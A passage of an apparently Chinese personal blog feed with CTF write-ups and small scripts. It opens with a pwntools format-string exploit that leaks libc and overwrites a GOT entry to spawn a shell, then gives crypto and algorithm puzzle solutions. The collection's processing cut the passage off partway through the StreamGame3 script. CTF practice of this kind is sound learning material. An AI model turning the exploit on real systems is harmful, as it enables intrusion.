class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">服务器: is the repeater.Hhhh...\n</span><br><span class="line">本地: is a repeater. Hhhh...\n</span><br></pre></td></tr></table></figure><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./pwn6.dms'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn6.dms'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="comment"># p = remote('123.206.131.120',10006)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,'b * 0x4007c1')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc addr</span></span><br><span class="line">p.recvuntil(<span class="string">'of humanity?\n'</span>)</span><br><span class="line">p.send(<span class="string">'%9$s'</span>.ljust(<span class="number">8</span>,<span class="string">':'</span>) +p64(<span class="number">0x0000000000601018</span>) )</span><br><span class="line"><span class="comment"># p.recvuntil('is the repeater.Hhhh...\n')</span></span><br><span class="line">p.recvuntil(<span class="string">'is a repeater. Hhhh...\n'</span>)</span><br><span class="line"></span><br><span class="line">put_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">p.info(<span class="string">'put_addr:    0x%x'</span>%put_addr)</span><br><span class="line">offset = libc.symbols[<span class="string">'puts'</span>] - libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">system_addr = put_addr - offset</span><br><span class="line">p.info(<span class="string">'system_addr: 0x%x'</span>%system_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts -&gt; system</span></span><br><span class="line">c = (system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">p.info(<span class="string">'c: 0x%x'</span>%c)</span><br><span class="line">p.send(<span class="string">'%&#123;&#125;c%10$hn'</span>.format(c).ljust(<span class="number">16</span>,<span class="string">':'</span>) +p64(<span class="number">0x0000000000601018</span> + <span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">'`'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts -&gt; do_system + 1059</span></span><br><span class="line">c = (system_addr &amp; <span class="number">0xffff</span>)</span><br><span class="line">p.info(<span class="string">'c: 0x%x'</span>%c)</span><br><span class="line">c -= <span class="number">333</span> <span class="comment"># do_system + 1059</span></span><br><span class="line">p.send(<span class="string">'%&#123;&#125;c%10$hn'</span>.format(c).ljust(<span class="number">16</span>,<span class="string">':'</span>) +p64(<span class="number">0x0000000000601018</span>))</span><br><span class="line">p.recvuntil(<span class="string">'`'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'`'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Test</title>
      <link href="/2018/11/05/Test/"/>
      <url>/2018/11/05/Test/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>从WordPress迁移到GitHub Pages.</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>国立台湾大学 pwn视频</title>
      <link href="/2018/08/16/%E5%9B%BD%E7%AB%8B%E5%8F%B0%E6%B9%BE%E5%A4%A7%E5%AD%A6-pwn%E8%A7%86%E9%A2%91/"/>
      <url>/2018/08/16/%E5%9B%BD%E7%AB%8B%E5%8F%B0%E6%B9%BE%E5%A4%A7%E5%AD%A6-pwn%E8%A7%86%E9%A2%91/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>台湾老哥在YouTube的视频，讲的还是很不错的，很适合入门，自己就是靠这个入门的。</p><h3 id="链接地址"><a href="#链接地址" class="headerlink" title="链接地址"></a>链接地址</h3><p> <a href="https://www.youtube.com/watch?v=WnDAHK-PxhQ&amp;frags=pl%2Cwn" target="_blank" rel="noopener">https://www.youtube.com/watch?v=WnDAHK-PxhQ&amp;frags=pl%2Cwn</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>24点计算器 by Python (带去重）</title>
      <link href="/2018/07/28/24%E7%82%B9%E8%AE%A1%E7%AE%97%E5%99%A8-by-Python-%E5%B8%A6%E5%8E%BB%E9%87%8D/"/>
      <url>/2018/07/28/24%E7%82%B9%E8%AE%A1%E7%AE%97%E5%99%A8-by-Python-%E5%B8%A6%E5%8E%BB%E9%87%8D/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>直接写过程了，代码中有注释，去重写的十分烂，之后再去优化吧。</p><a id="more"></a><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">ops = [<span class="string">'+'</span>, <span class="string">'-'</span>, <span class="string">'*'</span>, <span class="string">'/'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_card</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">        cards = list(map(int, input(<span class="string">'Input four card numbers: '</span>).split(<span class="string">' '</span>)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cards = sys.argv[<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span> len(cards) == <span class="number">4</span></span><br><span class="line">    <span class="keyword">except</span> AssertionError:</span><br><span class="line">        print(<span class="string">'Need four cards!'</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cards</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(cards)</span>:</span></span><br><span class="line">    orders = [<span class="string">'((&#123;&#125;&#123;&#125;&#123;&#125;)&#123;&#125;&#123;&#125;)&#123;&#125;&#123;&#125;'</span>, <span class="string">'(&#123;&#125;&#123;&#125;(&#123;&#125;&#123;&#125;&#123;&#125;))&#123;&#125;&#123;&#125;'</span>,</span><br><span class="line">              <span class="string">'&#123;&#125;&#123;&#125;((&#123;&#125;&#123;&#125;&#123;&#125;)&#123;&#125;&#123;&#125;)'</span>, <span class="string">'&#123;&#125;&#123;&#125;(&#123;&#125;&#123;&#125;(&#123;&#125;&#123;&#125;&#123;&#125;))'</span>, <span class="string">'(&#123;&#125;&#123;&#125;&#123;&#125;)&#123;&#125;(&#123;&#125;&#123;&#125;&#123;&#125;)'</span>]</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> card <span class="keyword">in</span> itertools.permutations(cards, r=<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">for</span> op <span class="keyword">in</span> itertools.product(ops, repeat=<span class="number">3</span>):</span><br><span class="line">            strings = []</span><br><span class="line">            <span class="keyword">for</span> order <span class="keyword">in</span> orders:</span><br><span class="line">                strings.append(order.format(</span><br><span class="line">                    card[<span class="number">0</span>], op[<span class="number">0</span>], card[<span class="number">1</span>], op[<span class="number">1</span>], card[<span class="number">2</span>], op[<span class="number">2</span>], card[<span class="number">3</span>]))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> string <span class="keyword">in</span> strings:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    ret = eval(string)</span><br><span class="line">                <span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> round(ret, ndigits=<span class="number">1</span>) == <span class="number">24</span>:</span><br><span class="line">                    result.append(string)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deduplication</span><span class="params">(r)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> list(set(r))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(data, index)</span>:</span></span><br><span class="line">    index = list(set(index))</span><br><span class="line">    index.sort(reverse=<span class="keyword">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> index:</span><br><span class="line">        <span class="keyword">del</span> data[i]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">improve</span><span class="params">(result)</span>:</span></span><br><span class="line">    result = deduplication(result)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去第一次括号去重</span></span><br><span class="line">    tmp1 = []</span><br><span class="line">    index = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> result:</span><br><span class="line">        ret = re.search(<span class="string">'\([^()]*\)'</span>, s).group()</span><br><span class="line">        tmp1.append(s.replace(ret, str(eval(ret))))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, t <span class="keyword">in</span> enumerate(tmp1):</span><br><span class="line">        <span class="keyword">for</span> j, tt <span class="keyword">in</span> enumerate(tmp1[i + <span class="number">1</span>:]):</span><br><span class="line">            <span class="keyword">if</span> t == tt:</span><br><span class="line">                index.append(i + j + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 去第二次括号去重</span></span><br><span class="line">    tmp2 = []</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> tmp1:</span><br><span class="line">        ret = re.search(<span class="string">'\([^()]*\)'</span>, s).group()</span><br><span class="line">        tmp2.append(s.replace(ret, str(eval(ret))))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, t <span class="keyword">in</span> enumerate(tmp2):</span><br><span class="line">        <span class="keyword">for</span> j, tt <span class="keyword">in</span> enumerate(tmp2[i + <span class="number">1</span>:]):</span><br><span class="line">            <span class="keyword">if</span> t == tt:</span><br><span class="line">                index.append(i + j + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 左右对称去重</span></span><br><span class="line">    <span class="keyword">for</span> i, t <span class="keyword">in</span> enumerate(tmp2):</span><br><span class="line">        <span class="keyword">for</span> j, tt <span class="keyword">in</span> enumerate(tmp2[i + <span class="number">1</span>:]):</span><br><span class="line">            loc = re.search(<span class="string">'[+\-*/]&#123;1&#125;'</span>, tt).start()</span><br><span class="line">            tt = tt[loc + <span class="number">1</span>:] + tt[loc] + tt[:loc]</span><br><span class="line">            <span class="keyword">if</span> tt == t:</span><br><span class="line">                index.append(i + j + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    delete(result, index)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    cards = input_card()</span><br><span class="line">    result = solve(cards)</span><br><span class="line">    result = improve(result)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> result:</span><br><span class="line">        print(x)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>*ctf Magic_number</title>
      <link href="/2018/04/22/ctf-Magic-number/"/>
      <url>/2018/04/22/ctf-Magic-number/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>一道 crypto 的题目</p><p>因为涉及到递归，写了半天也没写出来，下面为参考大佬的思路。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>1.Given n(1&lt;=n&lt;=14) integers a1,a2,…,an in interval [0,1024), you should determine them by sending several queries.</p><a id="more"></a><p>2.For each query, you can ask “how many integers are in interval [l,r)?” through stdout in format “? l r” where 0&lt;=l&lt;r&lt;=1024, and you will recieve an integer through stdin as the answer.</p><p>3.Finally, if all the integers are determined, you should output them in arbitrary order and in format “! a1 a2 … an”.</p><p>4.Please notice that some of the integers can be the same and that you can send no more than 99 queries in each level.</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>每个level会告诉你有多少个数，如下<code>Level 0 : n = 1</code></p><p>可以使用形如<code>? n m</code>查询[n,m)之间有多少个数，每个level最多查询99次</p><p>最后可以用形如<code>! a1 a2 ... an</code>来提交答案</p><p>方法很明显，类似二分法，每次查一半。<br>具体描述如下，每次level调用search函数，search函数递归的调用find函数。</p><p>find函数：<br>​    首先判断所以查找的区间是否正好差1，如果是代表此时的first为其中一个结果，当因为可能有重复，所以乘上所需找的个数，其实就是重复的次数。<br>​    然后去查找所需查找区间的前一半有多少个数，而后一半的数则为，总数减去前一半的。<br>​    最后，如果前后都大于零则，递归调用find查找前后两部分，然后想家。如果其中一个大于零，则调用find查找大于零的那一部分。</p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(con)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(left, right, nums)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> left == right - <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> [left] * nums</span><br><span class="line"></span><br><span class="line">        mid = (left + right) / <span class="number">2</span></span><br><span class="line">        con.sendline(<span class="string">'? %d %d'</span> % (left, mid))</span><br><span class="line">    </span><br><span class="line">        left_num = int(con.recvline()[:<span class="number">-1</span>])</span><br><span class="line">        right_num = nums - left_num</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> left_num &amp;gt; <span class="number">0</span> <span class="keyword">and</span> right_num &amp;gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> find(left,mid,left_num) + find(mid,right,right_num)</span><br><span class="line">        <span class="keyword">elif</span> left_num &amp;gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> find(left,mid,left_num)</span><br><span class="line">        <span class="keyword">elif</span> right_num &amp;gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> find(mid,right,right_num)</span><br><span class="line">    </span><br><span class="line">    con.recvuntil(<span class="string">'------------------------\n'</span>)</span><br><span class="line">    info = con.recvline()[:<span class="number">-1</span>]</span><br><span class="line">    con.info(info)</span><br><span class="line">    level, n = re.match(<span class="string">r'^Level (\d+) : n = (\d+)$'</span>,info).groups()</span><br><span class="line">    ret_list = find(<span class="number">0</span>,<span class="number">1024</span>,int(n))</span><br><span class="line">    ret = <span class="string">' '</span>.join(map(str,ret_list))</span><br><span class="line">    con.info(<span class="string">'Result %s'</span>%ret)</span><br><span class="line">    con.sendline(<span class="string">'! %s'</span>%ret)</span><br><span class="line"></span><br><span class="line">con = remote(<span class="string">'47.89.18.224'</span>, <span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    search(con)</span><br><span class="line"></span><br><span class="line">con.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>强网杯 StreamGame3</title>
      <link href="/2018/04/03/%E5%BC%BA%E7%BD%91%E6%9D%AF-StreamGame3/"/>
      <url>/2018/04/03/%E5%BC%BA%E7%BD%91%E6%9D%AF-StreamGame3/</url>
      
        <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>这题和其他的几题，例如streamgame1、2、4，有点不一样，因为直接爆破可能性太多了，根本不可行，所以我们有必要好好分析一下。</p><a id="more"></a><h3 id="流密码"><a href="#流密码" class="headerlink" title="流密码"></a>流密码</h3><p>关于流密码的知识可以Google了解，在这里就不再多说。这道题基本思路是，R1、R2、R3三个初始值，每次经过lfsr轮转，产生新的R1、R2、R3，并且将lastbit经过简单运算<code>out = (x1 * x2) ^ ( (x2 ^ 1) * x3)</code>的到一个out输出。out与tmp进行一系列运算得到最终结果，这题结果总共为1G的数据。（题目下载中只给了1M的，因为已经够了）</p><h3 id="爆破R1、R3"><a href="#爆破R1、R3" class="headerlink" title="爆破R1、R3"></a>爆破R1、R3</h3><p>而此题的突破点就在那个简单的运算，看一个表:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x1  x2  x3  out</span><br><span class="line">0   0   0   0</span><br><span class="line">0   0   1   1</span><br><span class="line">0   1   0   0</span><br><span class="line">0   1   1   0</span><br><span class="line">1   0   0   0</span><br><span class="line">1   0   1   1</span><br><span class="line">1   1   0   1</span><br><span class="line">1   1   1   1</span><br></pre></td></tr></table></figure><p>可以发现，x1、x3与out相同的几率很大，约为75%。所以我们可以单独爆破x1、x3，将x1或x3视为out进行加密，然后统计加密结果与正确结果的相同的概率有多少，在75%左右的就是正确答案了，错误答案，理论上来说应该为50%。</p><h3 id="爆破R2"><a href="#爆破R2" class="headerlink" title="爆破R2"></a>爆破R2</h3><p>在爆破成功了R1、R3之后我们就可以，直接爆破R2了。需要注意的是这里的爆破是根据概率统计来的，所以我们没有必要选全部加密文件来进行统计，选一小部分就可以了（32bit、64bit），因为根据前几题，错误的答案几乎不可能”蒙”出正确答案。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>本文参考了队内大佬的文章，文章链接:<code>http://blog.leanote.com/post/xp0intjnu@gmail.com/66c91498d13b</code></p><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>详细解决脚本如下，脚本中有注释：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lfsr</span><span class="params">(R,mask)</span>:</span></span><br><span class="line">    output = (R &amp;lt;&amp;lt; <span class="number">1</span>) &amp;amp; <span class="number">0xffffff</span></span><br><span class="line">    i = (R &amp;amp; mask) &amp;amp; <span class="number">0xffffff</span></span><br><span class="line"></span><br><span class="line">    lastbit = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line">        lastbit ^= (i &amp;amp; <span class="number">1</span>)</span><br><span class="line">        i = i &amp;gt;&amp;gt; <span class="number">1</span></span><br><span class="line">    output ^= lastbit</span><br><span class="line">    <span class="keyword">return</span> (output,lastbit)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_round</span><span class="params">(R1,R1_mask,R2,R2_mask,R3,R3_mask)</span>:</span></span><br><span class="line"></span><br><span class="line">    (R1_NEW,x1) = lfsr(R1,R1_mask)</span><br><span class="line">    (R2_NEW,x2) = lfsr(R2,R2_mask)</span><br><span class="line">    (R3_NEW,x3) = lfsr(R3,R3_mask)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (R1_NEW, R2_NEW, R3_NEW, (x1*x2)^((x2^<span class="number">1</span>)*x3) )</span><br><span class="line"></span><br><span class="line"><span class="comment"># x1 x2 x3 out</span></span><br><span class="line"><span class="comment">#  0  0  0  0</span></span><br><span class="line"><span class="comment">#  0  0  1  1</span></span><br><span class="line"><span class="comment">#  0  1  0  0</span></span><br><span class="line"><span class="comment">#  0  1  1  0</span></span><br><span class="line"><span class="comment">#  1  0  0  0</span></span><br><span class="line"><span class="comment">#  1  0  1  1</span></span><br><span class="line"><span class="comment">#  1  1  0  1</span></span><br><span class="line"><span class="comment">#  1  1  1  1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 单独用R1、R3进行加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_lfsr</span><span class="params">(R, R_mask)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        tmp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            (R, out) = lfsr(R, R_mask)</span><br><span class="line">            tmp = (tmp &amp;lt;&amp;lt; <span class="number">1</span>) ^ out</span><br><span class="line">        ret += chr(tmp)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计概率</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span><span class="params">(ret)</span>:</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> r, c <span class="keyword">in</span> zip(ret, cipher):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            mask = <span class="number">1</span> &amp;lt;&amp;lt; i</span><br><span class="line">            <span class="keyword">if</span> ord(r) &amp;amp; mask == c &amp;amp; mask:</span><br><span class="line">                cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cnt / (length * <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破R1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_r1</span><span class="params">()</span>:</span></span><br><span class="line">    possible = <span class="number">0</span></span><br><span class="line">    percent = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> R1 <span class="keyword">in</span> range(pow(<span class="number">2</span>, <span class="number">16</span>),pow(<span class="number">2</span>, <span class="number">17</span>)):</span><br><span class="line">        ret = single_lfsr(R1, R1_mask)</span><br><span class="line">        per = count(ret)</span><br><span class="line">        <span class="keyword">if</span> per &amp;gt; percent:</span><br><span 